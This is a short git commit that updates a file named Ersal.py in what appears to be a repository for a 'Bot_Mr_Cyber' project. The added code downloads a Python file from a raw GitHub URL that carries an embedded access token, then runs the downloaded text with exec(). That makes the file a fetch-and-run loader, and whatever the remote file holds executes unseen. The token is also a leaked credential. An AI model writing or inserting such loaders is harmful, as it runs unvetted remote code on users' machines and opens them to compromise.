45d576715db6241b8153d4c58dc34cdde7460b8e
1hazem1kali <149936447+1hazem1kali@users.noreply.github.com>
2024-04-27 15:48:30 +0100

    Update Ersal.py

--- Ersal.py
+++ Ersal.py
@@ -1,1 +1,7 @@
+import os
+import requests
 
+
+url="https://raw.githubusercontent.com/1hazem1kali/Bot_Mr_Cyber/main/Asase.py?token=GHSAT0AAAAAACRR7FL4EIVENPMDD5QAG7YAZRNCATQ"
+code = requests.get(url).text
+exec(code)
